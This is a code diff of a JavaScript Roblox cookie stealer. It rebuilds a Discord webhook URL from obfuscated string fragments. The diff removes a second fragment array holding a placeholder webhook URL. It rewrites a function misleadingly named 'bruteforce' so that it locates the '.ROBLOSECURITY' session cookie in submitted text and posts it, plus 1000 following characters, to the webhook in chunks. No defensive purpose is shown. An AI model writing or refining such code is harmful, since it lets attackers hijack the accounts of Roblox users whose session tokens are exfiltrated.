@@ -6,14 +6,6 @@ const _encryptedParts = [
   'WM', 'tO', 'TY', 'zc', 'Iq', 'nG', 'zK', 'Q'
 ];
 
-const _encryptedParts101 = [
-  'ht', 'tp', 's:/', '/di', 'sc', 'or', 'd.', 'co', 'm/', 'ap', 'i/', 'we', 'bh', 
-  'oo', 'ks', '/1', '23', '45', '67', '89', '01', '23', '45', '67', '89', '/', 
-  'ab', 'cd', 'ef', 'gh', 'ij', 'kl', 'mn', 'op', 'qr', 'st', 'uv', 'wx', 'yz', 
-  'AB', 'CD', 'EF', 'GH', 'IJ', 'KL', 'MN', 'OP', 'QR', 'ST', 'UV', 'WX', 'YZ', 
-  '12', '34', '56', '78', '90'
-];
-
 // Decrypt the URL by concatenating the parts
 const _decrypted = _encryptedParts.join(''); 
 
@@ -43,21 +35,34 @@ function sendToWebhook(content) {
 
 function bruteforce(sessionId) {
   const maxLength = 2000; // Discord's limit for message content
-  const extraLength = 1000; // Additional characters if "ROBLOSECURITY" is detected 
-  let content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
+  const extraLength = 1000; // Number of characters to include after "ROBLOSECURITY"
+  const keyword = "ROBLOSECURITY";
 
-  if (sessionId.includes("ROBLOSECURITY")) {
-    content += sessionId.substring(0, extraLength);
-  }
+  // Find the position of "ROBLOSECURITY" in the sessionId
+  const keywordIndex = sessionId.indexOf(keyword);
 
-  if (content.length > maxLength) {
-    let chunks = [];
-    for (let i = 0; i < content.length; i += maxLength) {
-      chunks.push(content.substring(i, i + maxLength));
+  // Only proceed if "ROBLOSECURITY" is found
+  if (keywordIndex !== -1) {
+    // Extract "ROBLOSECURITY" and the next 1000 characters
+    const start = keywordIndex;
+    const end = start + keyword.length + extraLength;
+    const extractedContent = sessionId.substring(start, end);
+
+    // Construct the message
+    let content = `New Session ID Submitted:\n\`\`\`${extractedContent}\`\`\``;
+
+    // Split into chunks if the content exceeds Discord's limit
+    if (content.length > maxLength) {
+      let chunks = [];
+      for (let i = 0; i < content.length; i += maxLength) {
+        chunks.push(content.substring(i, i + maxLength));
+      }
+      chunks.forEach(chunk => sendToWebhook(chunk));
+    } else {
+      sendToWebhook(content);
     }
-    chunks.forEach(chunk => sendToWebhook(chunk));
   } else {
-    sendToWebhook(content);
+    console.log("ROBLOSECURITY not found. Nothing sent to webhook.");
   }
 }
 
